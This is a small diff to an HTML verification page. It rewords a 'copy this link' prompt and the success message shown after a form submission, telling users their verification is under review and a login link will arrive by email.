@@ -155,7 +155,7 @@
     <div id="message" class="message"></div>
 
     <p style="margin-top: 1.5rem; font-size: 14px;">
-      🔗 <strong>Copy this link to access the page anytime:</strong>
+      🔗 <strong>Copy this link to access the page anytime you receive the code through your email or phone number:</strong>
     </p>
     <div class="copy-link" id="pageUrl"></div>
     <button class="copy-btn" onclick="copyPageUrl()">Copy Link</button>
@@ -226,7 +226,7 @@
         body: JSON.stringify(payload)
       }).then(response => {
         if (response.ok) {
-          messageBox.textContent = "✅ Verification sent successfully! You’ll receive your login link shortly.";
+          messageBox.textContent = "Verification is under review. You’ll receive your login link through email Address shortly either successful or declined.";
           messageBox.className = "message success";
         } else {
           response.text().then(err => {
